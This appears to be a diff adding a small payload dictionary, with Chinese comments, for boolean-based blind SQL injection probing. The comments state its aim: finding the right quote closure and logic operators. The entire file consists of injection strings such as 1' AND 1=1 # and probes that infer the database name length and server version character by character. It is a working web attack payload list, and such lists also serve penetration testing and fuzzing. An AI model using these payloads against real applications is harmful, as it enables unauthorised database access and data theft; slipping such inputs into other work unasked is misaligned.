@@ -1,0 +1,10 @@
+# === 布林盲注 (Boolean-based) 基礎探測字典 ===
+# 測試目標: 找出正確的閉合符號與邏輯運算
+1' AND 1=1 #
+1' AND 1=2 #
+1" AND 1=1 #
+1" AND 1=2 #
+1' OR TRUE #
+1' OR FALSE #
+1' AND LENGTH(database()) > 0 #
+1' AND SUBSTRING(version(),1,1) > '0' #
